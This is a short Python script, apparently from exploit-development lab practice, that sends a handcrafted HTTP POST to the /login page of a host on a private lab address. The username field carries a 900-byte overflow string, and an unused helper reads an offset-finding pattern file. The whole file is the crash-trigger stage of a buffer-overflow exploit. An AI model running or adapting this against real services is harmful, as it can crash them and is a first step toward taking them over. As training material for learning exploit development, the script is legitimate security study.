import socket

IP = "192.168.56.133"
PORT = 80

def getPattern():
    with open("./pattern.txt", "r") as f:
        data = f.read()
        return(data)

def exploit():
    inputBuffer = "A" * 900

    content = f"username={inputBuffer}&password=A"

    buffer  = b"POST /login HTTP/1.1\r\n"
    buffer += b"Host: " + IP.encode() + b"\r\n"
    buffer += b"User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
    buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
    buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer += b"Referer: http://" + IP.encode() + b"/login\r\n"
    buffer += b"Connection: close\r\n"
    buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += b"Content-Length: " + str(len(content)).encode() + b"\r\n"
    buffer += b"\r\n"
    buffer += content.encode()

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((IP, PORT))
            print(f"Sending:\n{buffer.decode()}")
            sock.sendall(buffer)
            
    except Exception as err:
        print(f"Error -> {err}")

if __name__ == "__main__":
    exploit()